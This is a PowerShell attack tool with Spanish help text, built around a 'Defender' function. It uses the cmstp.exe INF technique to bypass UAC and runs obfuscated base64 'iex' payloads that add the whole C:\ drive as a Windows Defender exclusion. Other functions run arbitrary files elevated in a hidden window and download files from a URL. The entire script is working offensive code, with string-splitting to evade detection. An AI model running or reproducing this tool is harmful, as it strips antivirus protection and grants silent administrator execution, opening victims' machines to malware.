#https://powershell.one/wmi/root/microsoft/windows/defender

function Defender
{
param
(

    [Parameter(ParameterSetName = 'Interface',
               Mandatory = $false,
               Position = 0)]
    [switch]
    $Add,

    [Parameter(ParameterSetName = 'Interface',
               Mandatory = $false,
               Position = 0)]
    [switch]
    $Exclusions,

    [Parameter(ParameterSetName = 'Interface',
               Mandatory = $false,
               Position = 0)]
    [switch]
    $GetAV,

    [Parameter(ParameterSetName = 'Interface',
               Mandatory = $false,
               Position = 0)]
    [switch]
    $User,

    [Parameter(ParameterSetName = 'Interface',
               Mandatory = $false,
               Position = 0)]
    [switch]
    $Admin,


    [Parameter(ParameterSetName = 'Extra',
               Mandatory = $false
               )]
    [switch]
    $Run,      
    
    [Parameter(ParameterSetName = 'Extra',
               Mandatory = $true
               )]
    [string]
    $FilePath,

    [Parameter(ParameterSetName = 'Extraa',
               Mandatory = $false
               )]
    [string]
    $Url,      

    [Parameter(ParameterSetName = 'Extraa',
               Mandatory = $true
               )]
    [string]
    $Out

)

$InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@


$B64Command = "([Text.Encoding]::Unicode.GetString([Convert]::('Fro' + 'mBa' + 'se64String').Invoke('LgAoAC'+'IAQQBkAGQALQBN'+'ACIAIAArACAAIgBwAF'+'AAcgBlAGYAZQByAGU'+'AbgBjAGUAIgApACAA'+'LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdA'+'BoACAAQwA6AFwAOwAgACgARwBlAH'+'QALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAG'+'EAYwBlACAAcgBvAG8AdAAvAG0AaQBjAHIAbw'+'BzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQ'+'BmAGUAbgBkAGUAcgAgACAALQBDAGwAY'+'QBzAHMATgBhAG0AZQAgAE0AUwBGAFQ'+'AXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4A'+'UABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUAbgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA=')))"

$comando1 = @"
powershell.exe -win h -c ".('ie' + 'x') $B64Command"
"@

$comando2 = @"
powershell.exe -win h -c ".('ie' + 'x') ([Text.Encoding]::Unicode.GetString([Convert]::('Fro' + 'mBa' + 'se64String').Invoke('JABQAGEAdAB' + 'oACAAPQAgACIAQwA6AFwAIgAKAAoAaQBmACAAKAAgACgAIABUAGUAcwB0AC0' + 'AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHM' + 'AbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAAKQAtAGUAcQAgACQAZgBhAGwAcwBlACAAKQAgAHsACgAgACAAIAAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARA' + 'BlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcACIAIAAtAE4AYQBtAGUAIAAnAFAAYQB0AGgAcwAnACAALQBGAG8AcgBjAGUACgB9AAoATgBlAHcALQBJAHQAZQBtAFAAcgBv' + 'AHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAJABQAGEAdABoACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUACgA=')))"
"@

$help_command = @"
Defender -Add (Agregar la exclusion)
Defender -Exclusion (Ver exclusiones actuales)
Defender -GetAV (Ver antivirus actuales)
Defender -User (Ver nombre de usuario actual)
Defender -Admin (Verificar si el usuario actual es admin o esta en el grupo de administradores)
Defender -Run -Filepath archivo.exe (Ejecutar un archivo como administrador)
Defender -Url "https://" -Out salida.pdf (Descargar un archivo)
"@


    $Version = $PSVersionTable
    if ($Version.PSVersion -eq "2.0")
    {
        Write-Warning "Version not compatible"
    }

    Function Help() {
        Write-Host $help_command 
    }

    Function Is_Admin() {
        return [bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    Function Check-Admin() {
        try {
            $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $adm = Get-LocalGroupMember -SID S-1-5-32-544 -ErrorAction Continue | Where-Object { $_.Name -eq $user}       
        }
        catch {
            try 
            {
                $User =  [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                $AdminGroupSID = 'S-1-5-32-544'
                $adminGroup = Get-WmiObject -Class Win32_Group -ErrorAction Continue | Where-Object { $_.SID -eq $AdminGroupSID }
                $members = $adminGroup.GetRelated("Win32_UserAccount")
                $members | ForEach-Object { if ($_.Caption -eq $User) {$adm = $true} }
            }
            catch 
            {
                adm = whoami /groups | findstr "S-1-5-32-544"
            }
        }

        $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -ErrorAction Continue).ConsentPromptBehaviorAdmin
        $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -ErrorAction Continue).PromptOnSecureDesktop
        if($ConsentPrompt -eq 2 -and $SecureDesktopPrompt -eq 1){
            throw "UAC estÃ¡ configurado en 'Notificar siempre'. Este mÃ³dulo no omite esta configuraciÃ³n."
        }

        if (-not $adm) {
            throw "El usuario actual no esta en el grupo de administradores"
        }
    }

    Function IsWinServer {
        $OS = Get-WmiObject -class Win32_OperatingSystem | Select-Object  -ExpandProperty Caption
        return $OS.Contains("Server")
    }

    Function Test-Exclusions 
    {
        Param (
            [Parameter( Position = 0, Mandatory = $True)]
            [Object]
            $Output
        )

        if ($Output -is [Object[]]) 
        {
            if ($Output[0].Contains("0x%1!x!")) 
            {
                return $False
            }

            $Output | ForEach-Object {
                if ($_ -eq "C:\")
                {
                    return $True
                }
            }
        } 
        else 
        {
            $Output.ExclusionPath | ForEach-Object {
                if ($_ -eq "C:\")
                {
                    return $True
                }
            }
        }

        return $False
    }

    Function IsCompatible 
    {
        $WinServer = IsWinServer
        $AV = Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName
        if ($null -eq $AV) {
            if (-not $WinServer) {
                throw "Error al obtener informacion del Windows Defender"
            }
        } 
        else 
        {
            if ($AV.Count -eq 1) {
                if ($AV -ne "Windows Defender") {
                    throw "Defender no instalado"
                }
            } 
            else 
            {
                if (-not $WinServer) {
                    $enable = (Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpComputerStatus -ErrorAction SilentlyContinue | Select-Object -Property "AntivirusEnabled").AntivirusEnabled
                    if (-not $enable) {
                        throw "Defender desactivado, hay mas de un AV activo"
                    }
                }
                 
            }
        }
    }

    Function UAC {
        Param (
            [Parameter( Position = 0, Mandatory = $True)]
            [String]
            $Command
        )

        $Process = Get-WmiObject -Class win32_process -ErrorAction Continue | Select-Object -ExpandProperty Name | Select-String "cmstp"
        if ($null -ne $Process) {
            Stop-Process -Name "cmstp" -Force -ErrorAction SilentlyContinue
        }

        $File = "C:\windows\temp\"
        $File += -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_}) + ".inf"

        $InfDataTemp = $InfData.Replace("REPLACE", $Command)
        try 
        {
            Set-Content -Path $file -Value $InfDataTemp
        }
        catch
        {
            throw "File .inf not create"
        }

        Write-Verbose "File $file writted"

        Start-Sleep -Seconds 5

        if (-not (Test-Path $File)) {
            throw "File .inf not found"
        }

        Write-Verbose "File checked"

        $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessStartInfo.FileName = "cmstp.exe"
        $ProcessStartInfo.Arguments = "/au $File"
        $ProcessStartInfo.UseShellExecute = $true
        $ProcessStartInfo.WindowStyle = "Hidden"
        $ProcessInformation = [Diagnostics.Process]::Start($ProcessStartInfo)
        Write-Verbose "Process create $ProcessInformation"

        Start-Sleep -Seconds 2
        $Id = $ProcessInformation.Id
        Get-Process -Id $Id -ErrorAction Stop | Out-Null
        Write-Verbose "Process checked"

        try 
        {
            $FormsAssembly = [System.Windows.Forms.AccessibleNavigation].Assembly
        }
        catch
        {
            $FormsAssembly = [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
        }

        if ($null -eq $FormsAssembly) {
            throw "No found Forms Assembly"
        }

        $UnsafeNativeMethods = $FormsAssembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
        $FindWindow = $UnsafeNativeMethods.GetMethod('FindWindow')
        if ($null -eq $FormsAssembly) {
            throw "No found FindWindow"
        }

        $PostMessage = $UnsafeNativeMethods.GetMethod('PostMessage', [Type[]]@([Runtime.InteropServices.HandleRef], [Int], [IntPtr], [IntPtr]))
        if ($null -eq $PostMessage) {
            throw "No found PostMessage"
        }

        $Times = 0
        [IntPtr]$WindowToFind = 0
        while ($WindowToFind -eq $null -or $WindowToFind -eq 0) {
            [IntPtr]$WindowToFind = $FindWindow.Invoke($null, @($null, "CorpVPN"))
            if ($ProcessInformation.ExitCode -eq 1) {
                throw "No found WindowsHandle"
            }
            
            if ($Times -eq 5) {
                throw "Tiempo limite find WindowsHandle"
            }
            $Times
            Start-Sleep -Seconds 5
        }

        Write-Verbose "Windows handle: $WindowToFind"

        $WM_SYSKEYDOWN = 0x0100;
        $VK_RETURN = 0x0D;

        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object Runtime.InteropServices.HandleRef($tmpPtr, $WindowToFind)

        $Continue = $false
        while ($Continue -eq $false) {
            try
            {
                $Continue = $PostMessage.Invoke($null, @($HandleRef, $WM_SYSKEYDOWN, [IntPtr]$VK_RETURN, [IntPtr]::Zero))
                Start-Sleep -Seconds 5
            }
            catch
            {
                throw $_
            }
        }
        
        Write-Verbose "Removing $file file"
        Remove-Item $File

        Write-Verbose "Command executed"
    }

    Function Check-File {
        Param (
            [Parameter( Position = 0, Mandatory = $True)]
            [String]
            $Path
        )

        try 
        {
            $Times = 0
            while (-not (Test-Path $Path -ErrorAction Continue)) {
                if ($Times -eq 5) {
                    throw "Error en aÃ±adir la exclusion (tiempo limite)"
                }

                $Times++
                Start-Sleep -Seconds 5
            }

            Write-Verbose "Leyendo archivo externo"
            $ExclusionPath = Get-Content $Path
            return $ExclusionPath
        }
        catch 
        {
            throw "Error: $_"
        }
    }

    Function Get-CommandUAC
    {
        $comando = $comando1
        try 
        {
            $enable = (Get-MpComputerStatus -ErrorAction SilentlyContinue).AntivirusEnabled 
        }
        catch
        {
            $enable = (Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpComputerStatus -ErrorAction SilentlyContinue | Select-Object -Property "AntivirusEnabled").AntivirusEnabled
            if (IsWinServer) {
                $comando = $comando2
            }
        }

        if (-not $enable) {
            throw "Defender no activo"
        }

        return $comando
    }

    if ($Exclusions)
    {
        if (Is_Admin) {
            $ExclusionPath = Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpPreference -ErrorAction SilentlyContinue | Select-Object -Property ExclusionPath
            if (-not $ExclusionPath.ExclusionPath)
            {    
                throw "Error al obtener las exclusiones de los antivirus"
            }

            $ExclusionPath.ExclusionPath
        } 
        else 
        {
            Check-Admin
            $Path = Join-Path -Path (Get-ChildItem -Path Env:\PUBLIC).Value -ChildPath Exclusions
            if (Test-Path -Path $Path) 
            {
                $ExclusionPath = Get-Content $Path
                $ExclusionPath
            } 
            else 
            {
                IsCompatible

                $UAC_Command = Get-CommandUAC
                UAC -Command $UAC_Command

                $ExclusionPath = Check-File -Path $Path
                $ExclusionPath
            }
        }
    }
    elseif ($GetAV) 
    {

        $AVS = Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName
        if ($null -eq $AVS) {
            throw "Error al obtener los antivirus"
        }

        try 
        {
            $enable = (Get-MpComputerStatus -ErrorAction SilentlyContinue).AntivirusEnabled 
        }
        catch
        {
            $enable = (Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpComputerStatus -ErrorAction SilentlyContinue | Select-Object -Property "AntivirusEnabled").AntivirusEnabled
        }

        Write-Host "Antivirus:"
        if (-not $enable) {
                $AVS | ForEach-Object { 
                if ($_ -eq "Windows Defender") {
                    Write-Host "Windows Defender (No activo)"
                } else {
                    Write-Host $_
                }
            }
        } else {
            $AVS
        }
    } 
    elseif ($User)
    {
        [Environment]::UserName
    }
    elseif ($Admin) 
    {   
        if (Is_Admin) {
            Write-Host "El usuario actual es administrador"
        }
        else 
        {
            Check-Admin
            Write-Host "El usuario actual esta en el grupo de administradores"
        }
    }
    elseif ($Run)
    {   
        if (![System.IO.File]::Exists($FilePath) -or ![System.IO.Path]::IsPathRooted($FilePath)) {
            $File = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($FilePath)
            if (![System.IO.File]::Exists($File) -or ![System.IO.Path]::IsPathRooted($File)) {
                $File = (Get-Command $FilePath).Source
                if (![System.IO.File]::Exists($File) -or ![System.IO.Path]::IsPathRooted($File)) {
                    Write-Host "Ruta de archivo no encontrada"
                    return
                }
            }
            $FilePath = $File
        }

        if (Is_Admin) {
            try 
            {
                Start-Process -WindowStyle Hidden -FilePath $FilePath
                Write-Host "Ejecucion exitosa"
            } 
            catch 
            {
                Write-Host "Error al ejecutar"
                Write-Host $_
            }
        }
        else 
        {
            IsCompatible
            Check-Admin
            
            UAC -Command $FilePath
            Write-Host "Ejecucion exitosa"
        }
        
    }
    elseif ($Url) 
    {
        if ($Out.Contains("/")) {
            if (![System.IO.File]::Exists($Out)) {
                $FilePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($FilePath)
                if (![System.IO.File]::Exists($FilePath)) {
                    throw "Ruta de salida no encontrada"
                }
            }
        }

        try {
            (New-Object System.Net.WebClient).DownloadFile($Url, $Out)
        }
        catch {
            throw $_
        }
    }
    elseif ($Add) {
        IsCompatible

        $UAC_Command = Get-CommandUAC

        if (Is_Admin) 
        {

            Write-Verbose "Ejecucion como admin"
            .("i" + "ex") ([Text.Encoding]::Unicode.GetString([Convert]::('Fro' + 'mBa' + 'se64String').Invoke('LgAoACIAQQB'+'kAGQALQBNACI'+'AIAArACAAIgBwAFAAcgBlAGYAZ'+'QByAGUAbgBjAGUAIgApACAA'+'LQBFAHgAYwBsAHU'+'AcwBpAG8AbgBQAGEAdABoACAAQwA6AFwA')))
            
            #change?Â¿
            $ExclusionsOutput = Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpPreference -ErrorAction SilentlyContinue | Select-Object -Property ExclusionPath
            if (-not $ExclusionsOutput.ExclusionPath)
            {    
                throw "Error al obtener las exclusiones de los antivirus"
            }
        }
        else
        {

            Write-Verbose "Ejecucion como usuario normal"
            $Path = Join-Path -Path (Get-ChildItem -Path Env:\PUBLIC).Value -ChildPath Exclusions
            Check-Admin

            UAC -Command $UAC_Command

            $ExclusionsOutput = Check-File -Path $Path
        }


        if ($null -eq $ExclusionsOutput) {
            Write-Verbose "Debug: $ExclusionsOutput"
        }

         # Check Exclusions
         if (Test-Exclusions -Output $ExclusionsOutput) {
            Write-Host "Exclusion agregada exitosamente`n"
        } elseif (IsWinServer) {
            if ((Test-Path "C:\Windows\System32\GroupPolicy\Machine\Registry.pol") -or (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) 
            {
                try 
                {
                    gpupdate /force
                } 
                catch 
                {
                    throw "Error al agregar la exclusion (gpupdate)"   
                }
            } 
            else 
            {
                $Condition = $false
                while (!$Condition) 
                { 
                    Write-Host "Para incluir las exclusiones es necesario reiniciar"
                    $Option = Read-Host -Prompt 's/n'.ToLower()
                    if ($Option -eq "y" -or $Option -eq "s" -or $Option -eq "si" -or $Option -eq "yes") {
                        Restart-Computer -Force
                        $Condition = $true
                    } elseif ( $Option -eq "n" -or $Option -eq "no"){
                        $Condition = $true
                    } else {
                        Write-Host "Opcion incorrecta"
                    }
                }
            }
        } 
        else 
        {
            Write-Host "Error al agregar la exclusion`n"
        }



    }
    else
    {
        Help
    }
}
